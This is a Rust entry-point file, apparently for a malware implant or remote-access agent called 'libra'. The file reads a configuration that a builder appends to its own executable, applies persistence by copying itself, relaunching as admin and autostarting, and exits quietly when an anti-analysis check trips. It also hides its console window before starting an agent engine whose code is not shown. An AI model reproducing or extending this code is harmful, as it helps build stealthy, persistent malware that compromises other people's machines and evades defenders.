#![cfg_attr(feature = "desktop", windows_subsystem = "windows")]

use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();

    // Parse injected config from binary (CONFIG_MAGIC block at end of exe)
    let injected = parse_injected_config();

    // Extract persistence/config params before engine takes ownership
    let require_admin = injected.as_ref().map(|i| i.require_admin).unwrap_or(false);
    let copy_to_path = injected.as_ref().and_then(|i| i.copy_to_path.as_deref());
    let enable_persistence = injected
        .as_ref()
        .map(|i| i.enable_persistence)
        .unwrap_or(false);

    // Apply persistence early (may relaunch/copy and exit)
    libra_engine::persistence::PersistenceManager::apply(
        require_admin,
        copy_to_path,
        enable_persistence,
    );

    // Anti-analysis check (skip uptime on boot to avoid self-kill on autostart)
    let is_boot = args.iter().any(|a| a == "--boot");
    if !libra_modules::anti_analysis::should_execute_ex(is_boot) {
        std::process::exit(0);
    }

    // Load config from injected + CLI args
    let cfg = libra_engine::config::ConfigManager::load(&args, injected);

    // Build tokio runtime and run the engine
    let rt = match tokio::runtime::Runtime::new() {
        Ok(rt) => rt,
        Err(_) => {
            libra_common::dlog!("[!] Failed to create tokio runtime");
            std::process::exit(1);
        }
    };

    rt.block_on(async {
        let mut engine = libra_engine::engine::AgentEngine::new(cfg);
        match engine.run().await {
            Ok(()) => {}
            Err(e) => libra_common::dlog!("[!] Agent error: {}", e),
        }
    });
}

// ── Config Injection ─────────────────────────────────────────────────────

/// Search the current binary for CONFIG_MAGIC and parse InjectedConfig from it.
fn parse_injected_config() -> Option<libra_common::models::InjectedConfig> {
    use libra_common::models::CONFIG_MAGIC;
    use std::io::Read;

    let exe_path = match env::current_exe() {
        Ok(p) => p,
        Err(_) => return None,
    };

    let mut file = match std::fs::File::open(&exe_path) {
        Ok(f) => f,
        Err(_) => return None,
    };

    let mut data = Vec::new();
    if file.read_to_end(&mut data).is_err() {
        return None;
    }

    if data.len() < CONFIG_MAGIC.len() + 4 {
        return None;
    }

    // Search for CONFIG_MAGIC from the end (it's the last thing appended)
    let magic_pos = data
        .windows(CONFIG_MAGIC.len())
        .rposition(|w| w == CONFIG_MAGIC.as_slice());

    let pos = match magic_pos {
        Some(p) => p + CONFIG_MAGIC.len(),
        None => return None,
    };

    // Next 4 bytes: length (little-endian u32)
    if pos + 4 > data.len() {
        return None;
    }

    let len_bytes: [u8; 4] = data[pos..pos + 4].try_into().unwrap();
    let json_len = u32::from_le_bytes(len_bytes) as usize;

    let json_start = pos + 4;
    if json_start + json_len > data.len() {
        return None;
    }

    let json_bytes = &data[json_start..json_start + json_len];
    let json_str = std::str::from_utf8(json_bytes).ok()?;

    serde_json::from_str::<libra_common::models::InjectedConfig>(json_str).ok()
}
